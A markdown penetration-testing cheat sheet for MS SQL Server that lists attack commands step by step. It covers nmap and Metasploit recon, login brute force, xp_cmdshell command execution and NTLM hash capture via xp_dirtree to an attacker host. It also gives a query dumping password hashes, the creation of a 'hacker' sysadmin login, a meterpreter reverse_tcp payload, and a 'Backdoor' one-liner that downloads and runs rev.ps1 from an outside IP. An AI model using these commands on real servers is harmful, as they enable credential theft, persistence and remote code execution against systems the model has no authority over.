<h1>Pentest MS SQL server</h1> 

MSSQL port:    1433

**Summery:** 

- [Recon](#recon)
  - [Check info](#check-info)
- [Attack](#attack)
  - [Test Empty Password](#test-empty-password)
  - [Login brutforce](#login-brutforce)
  - [Enumerate MSSQL](#enumerate-mssql)
  - [Exploit](#exploit)

## Recon 

### Check info  
> nmap 

	nmap -sU -p 1433 --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-tables TARGET_IP

> msf

```ruby
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS TARGET_IP
run
```


## Attack

### Test Empty Password

    nmap -p 1433 --script ms-sql-empty-password  TARGET_IP
### Login brutforce 
```ruby
use auxiliary/scanner/mssql/mssql_login
set RHOSTS TARGET_IP
set user_file /root/Desktop/user.txt
set pass_file /root/Desktop/pass.txt
run
```

### Enumerate MSSQL

```ruby
use auxiliary/admin/mssql/mssql_enum
set RHOSTS TARGET_IP
set password PASSWORD
run
```

### Run query 
```ruby
mssqlclient.py 'USERNAME:PASSWORD@TARGET_IP'
mssqlclient.py 'USERNAME:PASSWORD@TARGET_IP' -db DATABASE
```
#### Query 

> Run command
```powershell
EXEC master..xp_cmdshell 'whoami'
```
> NTLM Service Hash gathering
```powershell
xp_dirtree '\\ATTACK_IP\any\thing'
exec master.dbo.xp_dirtree '\\ATTACK_IP\any\thing'
exec master..xp_dirtree '\\ATTACK_IP\any\thing'
```
> Manual
```powershell
SELECT name FROM master.dbo.sysdatabases #Get databases
SELECT table_name  FROM DATABASE_NAME.INFORMATION_SCHEMA.TABLES; #Get table names
SELECT table_catalog,table_name FROM DATABASE_NAME.INFORMATION_SCHEMA.columns; #Get table names
```
List users
```sql
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```
Create user with sysadmin privs
```powershell
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'
```
### Exploit cme

> cme

	cme mssql TARGET_IP -u USERNAME -p PASSWORD
	cme mssql TARGET_IP -u USERNAME -p PASSWORD -a normal


> Run command 

	cme mssql TARGET_IP -u USERNAME -p PASSWORD -a normal -x 'whoami'

### Exploit

    msf > use exploit/windows/mssql/mssql_payload
    msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp


### Backdoor
```powershell
EXEC master..xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
```


# DOC

    https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server